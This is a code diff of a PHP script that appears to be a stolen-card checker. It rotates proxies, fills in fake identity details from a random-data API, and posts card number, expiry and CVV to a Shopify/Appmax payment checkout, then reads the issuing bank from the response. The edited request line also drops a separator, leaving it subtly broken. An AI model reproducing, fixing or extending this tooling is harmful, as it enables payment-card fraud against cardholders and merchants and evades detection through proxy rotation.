@@ -26,14 +26,14 @@ function GetStr($string, $start, $end)
   return $str[0];
 }
 
-function rebootproxys()
+function binsforeveryoneproxys()
 {
   $poxySocks = file("proxy.txt");
   $myproxy = rand(0, sizeof($poxySocks) - 1);
   $poxySocks = $poxySocks[$myproxy];
   return $poxySocks;
 }
-$poxySocks4 = rebootproxys();
+$poxySocks4 = binsforeveryoneproxys();
 
 ////////////////////////////===[Randomizing Details Api]
 
@@ -55,7 +55,7 @@ $phone = $matches1[1][0];
 preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
 $postcode = $matches1[1][0];
 preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
-$cpf = $matches1[1][0];
+$document = $matches1[1][0];
 
 ////////////////////////////===[Zone Details]
 
@@ -144,7 +144,7 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 ));
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment-type=&card%5B0%5D%5Bnumber%5D='.$cc.'&card%5B0%5D%5Bexpiry%5D='.$mes.'%2F'.$ano.'&card%5B0%5D%5Bcvv%5D='.$cvv.'&card%5B0%5D%5Bholder_name%5D='.$name.'&card%5B0%5D%5Bholder_document%5D='.$cpf.'&card%5B0%5D%5Bholder_birthdate%5D=&card%5B0%5D%5Byear%5D='.$ano.'&card%5B0%5D%5Bmonth%5D='.$mes.'&card%5B0%5D%5Bgateway%5D=appmax&card%5B0%5D%5BaffiliationId%5D=139626&card%5B0%5D%5Bbrand%5D=mastercard&card%5B0%5D%5Binstallments%5D=3&card%5B0%5D%5Bcustomerphone%5D=(66)+99908-6578&card%5B0%5D%5BdocType%5D=CPF&card%5B0%5D%5Bamount%5D=216%2C81&_token=gnP1u928FgjH9Z2X1Xsuv7NRZP2PbuoLUcseT1Ei&cart_token=shopify-69458e918c290438a36e8b927733dd96');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment-type=&card%5B0%5D%5Bnumber%5D='.$cc.'&card%5B0%5D%5Bexpiry%5D='.$mes.'%2F'.$ano.'&card%5B0%5D%5Bcvv%5D='.$cvv.'&card%5B0%5D%5Bholder_name%5D='.$name.'&card%5B0%5D%5Bholder_document%5D='.$document.'-08&card%5B0%5D%5Bholder_birthdate%5D=&card%5B0%5D%5Byear%5D='.$ano.'&card%5B0%5D%5Bmonth%5D='.$mes.'card%5B0%5D%5Bgateway%5D=appmax&card%5B0%5D%5BaffiliationId%5D=139626&card%5B0%5D%5Bbrand%5D=mastercard&card%5B0%5D%5Binstallments%5D=3&card%5B0%5D%5Bcustomerphone%5D='.$phone.'&card%5B0%5D%5BdocType%5D=CPF&card%5B0%5D%5Bamount%5D=216%2C81&_token=gnP1u928FgjH9Z2X1Xsuv7NRZP2PbuoLUcseT1Ei&cart_token=shopify-69458e918c290438a36e8b927733dd96');
 $fim = curl_exec($ch);
 $fim = json_decode($fim,true);
 $bank = $fim['bank']['name'];
